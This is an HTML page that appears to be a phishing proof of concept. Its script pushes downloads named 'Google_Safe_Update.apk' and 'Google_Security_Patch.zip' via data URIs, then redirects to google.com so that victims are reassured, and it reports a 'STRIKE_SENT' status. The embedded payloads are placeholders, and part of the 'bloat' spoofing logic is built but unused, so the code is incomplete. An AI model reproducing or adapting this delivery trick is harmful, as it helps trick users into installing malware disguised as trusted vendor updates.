<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>V398: SUBDOMAIN_STRIP_SPOOF</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">

    <h1 style="color:#0ff; text-shadow:0 0 15px #0ff;">[!] V398: SUBDOMAIN_STRIP_SPOOF</h1>
    <div id="status" style="border:1px solid #333; padding:15px; margin:20px;">> STANDBY: READY FOR BLOAT...</div>
    
    <div style="display: flex; justify-content: center; gap: 20px;">
        <button type="button" id="apkBtn" style="padding:25px; background:#111; color:#0ff; border:2px solid #0ff; cursor:pointer; font-weight:bold;">
            EXECUTE_APK_SPOOF
        </button>

        <button type="button" id="zipBtn" style="padding:25px; background:#111; color:#f0f; border:2px solid #f0f; cursor:pointer; font-weight:bold;">
            EXECUTE_ZIP_SPOOF
        </button>
    </div>

<script>
    function triggerDownload(type) {
        // 1. THE BLOAT LOGIC
        const host = "google.com";
        const padding = ".https://google.com";
        const longSub = host + padding.repeat(10); 
        
        let payload, filename;

        if (type === 'apk') {
            // MIME Type untuk Android Package
            payload = `data:application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=`;
            filename = "Google_Safe_Update.apk";
        } else {
            // MIME Type untuk ZIP Archive
            payload = `data:application/zip;base64,UEsDBBQAAAAIAAAA... (base64 zip dummy)`;
            filename = "Google_Security_Patch.zip";
        }

        // 3. TRIGGER DOWNLOAD
        const a = document.createElement('a');
        a.href = payload;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        
        setTimeout(() => {
            document.body.removeChild(a);
            // Redirect ke origin asli untuk meyakinkan user
            window.location.replace("https://www.google.com");
        }, 150);

        document.getElementById('status').innerText = `> STRIKE_SENT: ${filename}`;
    }

    document.getElementById('apkBtn').addEventListener('click', () => triggerDownload('apk'));
    document.getElementById('zipBtn').addEventListener('click', () => triggerDownload('zip'));
</script>
</body>
</html>
